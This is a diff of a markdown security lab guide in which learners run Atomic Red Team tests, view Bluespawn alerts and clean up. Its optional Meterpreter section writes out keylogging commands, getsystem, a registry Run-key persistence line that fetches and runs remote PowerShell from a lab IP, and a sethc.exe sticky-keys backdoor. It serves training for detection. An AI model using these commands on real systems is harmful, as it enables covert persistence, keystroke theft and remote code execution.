@@ -114,62 +114,68 @@ It should look like this:
 
 >[!NOTE]
 >
->There might be some errors when this runs. This is normal.
+>There might be some errors when this runs. This is 
+normal.
 
-Please note we had to cross reference the old numbering witgh the new.
+>[!NOTICE]
+>
+>We had to cross reference the old numbering with the new.
+>
+>You can find that mapping here:
+>
+>https://attack.mitre.org/docs/subtechniques/subtechniques-crosswalk.json
+>
+>![](attachments/crossreference.png)
 
-You can find that mapping here:
 
-https://attack.mitre.org/docs/subtechniques/subtechniques-crosswalk.json
+You should be getting a lot of alerts with Bluespawn! Switch tabs in your Terminal to see them:
 
+![](attachments/bluespawndetections.png)
 
-You should be getting a lot of alerts with Bluespawn Switch tabs in your Terminal to see them:
+Now, let’s go back to the PowerShell window and clean up:
 
-![](attachments/Clipboard_2020-06-16-09-47-26.png)
-
-
-Now, let’s go back to the PowerShell prompt and clean up:
-
-PS C:\AtomicRedTeam\invoke-atomicredteam> `Invoke-AtomicTest All -Cleanup`
+<pre>Invoke-AtomicTest All -Cleanup</pre>
 
 It should look like this:
 
 ![](attachments/Clipboard_2020-06-23-13-36-10.png)
 
-# If you have more time
+# Optional Section: Meterpreter
 
-Feel free to exploit system using the commands we went through in AppLocker or Sysmon and then run the following Meterpreter commands
+If you have more time, feel free to exploit system using the commands we went through in AppLocker or Sysmon and then run the following Meterpreter commands:
 
+<pre>keyscan_start</pre>
 
-Run commands
-
-meterpreter > `keyscan_start`
-
-meterpreter > `keyscan_dump`
+<pre>keyscan_dump</pre>
 
 ![](attachments/Clipboard_2020-06-15-13-52-00.png)
 
+<pre>shell</pre>
 
+<pre>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://172.20.243.5:80/a'))\"" /f</pre>
 
-meterpreter > `shell`
-
-C:\> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://172.20.243.5:80/a'))\"" /f`
-
-C:\>  `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"`
+<pre>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"</pre>
 
 ![](attachments/Clipboard_2020-06-15-14-00-53.png)
 
 
-
-meterpreter >`getsystem`
+<pre>getsystem</pre>
 
 ![](attachments/Clipboard_2020-06-15-13-52-28.png)
 
 
 ![](attachments/Clipboard_2020-06-15-13-56-34.png)
 
-[Return To Lab List](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/navigation.md)
+***                                                       
 
+<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>
 
+***Finished with the Labs?***
+
+Please be sure to destroy the lab environment!
+
+[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
+
+---
 
 
